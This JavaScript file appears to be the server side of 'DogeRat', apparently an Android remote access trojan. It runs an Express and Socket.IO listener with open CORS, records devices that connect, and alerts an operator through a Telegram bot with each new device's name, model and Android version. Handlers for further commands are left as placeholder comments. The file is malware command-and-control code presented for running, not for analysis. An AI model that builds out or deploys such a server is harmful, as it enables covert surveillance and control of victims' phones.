const express = require('express');
const { createServer } = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

const app = express();
const server = createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

const upload = multer({ dest: '/tmp/' });

// Load configuration
let config;
try {
  config = JSON.parse(fs.readFileSync('data.json', 'utf8'));
} catch (error) {
  console.log('Error loading data.json:', error);
  config = { host: process.env.VERCEL_URL || 'http://localhost:3000' };
}

const botToken = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
const bot = new TelegramBot(botToken, { polling: false });

let devices = [];
let notifications = [];

// Basic routes
app.get('/', (req, res) => {
  res.send('DogeRat Server is running!');
});

app.get('/test', (req, res) => {
  res.json({ status: 'Server is running', devices: devices.length });
});

// Socket.IO connection handling
io.on('connection', (socket) => {
  console.log('Device connected:', socket.id);

  socket.on('device-connected', (data) => {
    devices.push({ id: socket.id, ...data });
    console.log('New device:', data);

    // Send Telegram notification
    if (botToken !== 'YOUR_BOT_TOKEN_HERE') {
      bot.sendMessage(process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID',
        `<b>✯ New device connected</b>\n\nDevice: ${data.device}\nModel: ${data.model}\nAndroid: ${data.version}`);
    }
  });

  // Handle other socket events...
  socket.on('disconnect', () => {
    devices = devices.filter(device => device.id !== socket.id);
    console.log('Device disconnected:', socket.id);
  });

  // Add more socket event handlers as needed
});

module.exports = app;
